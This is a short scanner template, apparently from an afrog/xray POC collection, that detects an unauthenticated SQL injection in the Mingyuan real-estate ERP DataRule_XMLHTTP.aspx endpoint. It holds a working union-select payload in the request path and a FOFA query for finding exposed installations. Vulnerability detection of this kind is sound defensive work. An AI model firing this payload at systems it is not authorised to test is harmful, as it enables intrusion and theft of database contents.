# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - Microsoft SQL Server
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/BUAdjust/DataRule/DataRule_XMLHTTP.aspx/?ywtype=getFieldXML&table=-1%27%20union%20select%20@@version--'
id: mingyuanyun-erp-datarule-xmlhttp-sqli
info:
  author: avic123
  description: |-
    某源地产ERP系统 WebService服务针对客户端IP权限校验时,XMLHTTP接口出现SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息(例如管理员后台密码、站点用户个人信息,之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。
    fofa: body="明源地产ERP" || body="用户登录-明源云ERP" || (body="明源云" && body="ERP") || body="/PubPlatform/Login/index.aspx"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 明源ERP-DataRule_XMLHTTP-存在SQL注入漏洞
  severity: high
  tags: mingyuanyun,erp,sqli,argus-import
